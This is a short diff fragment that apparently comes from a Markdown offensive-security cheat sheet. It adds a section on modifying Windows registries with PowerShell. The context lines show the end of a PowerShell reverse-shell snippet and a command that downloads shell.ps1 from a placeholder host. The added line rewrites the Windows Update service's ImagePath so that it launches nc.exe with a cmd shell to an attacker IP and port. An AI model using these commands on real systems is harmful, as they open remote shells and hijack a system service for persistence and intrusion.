@@ -101,3 +101,7 @@ ength);​ $stream​ .Flush()};​ $client​ .Close()
 START /B "" powershell "(new-object System.Net.WebClient).Downloadfile('http://example:port/shell.ps1', 'shell.ps1')"
 ```
 
+### [Modify Registries using powershell]
+```
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\services\wuauserv" -Name ImagePath -Value "C:\path\to\nc.exe IP PORT -e cmd"
+```
